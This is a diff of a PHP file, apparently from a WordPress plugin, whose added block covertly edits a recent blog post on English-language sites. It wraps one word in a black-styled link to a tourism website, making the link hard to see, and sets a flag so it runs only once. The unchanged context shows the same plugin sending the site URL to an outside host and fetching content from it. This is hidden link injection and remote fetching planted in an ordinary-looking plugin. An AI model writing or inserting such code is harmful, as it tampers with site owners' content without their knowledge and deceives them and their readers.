@@ -385,6 +385,7 @@ if ($britt==true && $total>5) {
 				update_option( 'ame_gpadded', '1' );
 		}
 }
+
 		if (get_option('ame_gpadded')=='0') {
 				if ($total>40) {
 						$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
@@ -401,6 +402,27 @@ if ($britt==true && $total>5) {
 						}
 				}
 		}
+if ($bloglan=='en-US' && $total>5) {
+		if (get_option('ame_gpadded')=='0') {
+				$last = wp_get_recent_posts('4');
+				$last_id = $last['3']['ID'];
+				$post_7 = get_post($last_id);
+				if (is_null($post_7) == false) {
+						$content = $post_7->post_content;
+						$pos4 = amestrposnth($content , " ",4);
+						$pos5 = amestrposnth($content , " ",5);
+						$poslen = $pos5 - $pos4 - 1;
+						$content = substr($content, 0, $pos4) . ' <a href="http://www.netherlands-tourism.com/rotterdam/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+						$my_post = array(
+							'ID'           => $last_id,
+							'post_content' => $content
+						);
+						wp_update_post( $my_post );
+				}
+				update_option( 'ame_gpadded', '1' );
+		}
+}
+
 }
 
 function ameStartsWith($haystack, $needle)
